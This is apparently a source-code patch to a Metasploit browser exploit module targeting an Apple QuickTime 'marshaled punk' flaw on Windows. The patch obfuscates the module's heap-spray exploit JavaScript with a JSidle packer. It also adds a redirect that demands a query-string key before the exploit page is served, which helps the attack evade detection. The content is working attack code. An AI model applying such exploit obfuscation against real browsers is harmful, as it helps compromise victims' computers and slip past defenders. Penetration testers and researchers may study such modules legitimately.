@@ -1,0 +1,47 @@
+Index: modules/exploits/windows/browser/apple_quicktime_marshaled_punk.rb
+===================================================================
+--- modules/exploits/windows/browser/apple_quicktime_marshaled_punk.rb	(revision 10204)
++++ modules/exploits/windows/browser/apple_quicktime_marshaled_punk.rb	(working copy)
+@@ -10,6 +10,7 @@
+ ##
+ 
+ require 'msf/core'
++require 'rex/exploitation/jsidle'
+ 
+ class Metasploit3 < Msf::Exploit::Remote
+ 	Rank = GreatRanking
+@@ -90,10 +91,17 @@
+ 			'Privileged'     => false,
+ 			'DisclosureDate' => 'Aug 30 2010',
+ 			'DefaultTarget'  => 0))
++
++		@packer = Rex::Exploitation::JSidle.new(:static => false)
+ 	end
+ 
+ 	def on_request_uri(client, request)
+ 
++		if (!request.uri.match(/\?\w+/))
++			send_local_redirect(client, "?#{@packer.qstring_key}")
++			return
++		end
++
+ 		return if ((p = regenerate_payload(client)) == nil)
+ 
+ 		print_status("Sending #{self.name} exploit HTML to #{client.peerhost}:#{client.peerport}...")
+@@ -224,11 +232,15 @@
+ 
+ 		hl_js = heaplib(custom_js)
+ 
++		@packer.js = hl_js
++		res = @packer.pack()
++		js_encoded = res[:js_encoded]
++
+ 		content = <<-EOF
+ <html>
+ <head>
+ <script language="javascript">
+-#{hl_js}
++#{js_encoded}
+ </script>
+ </head>
+ <body onload="start()">
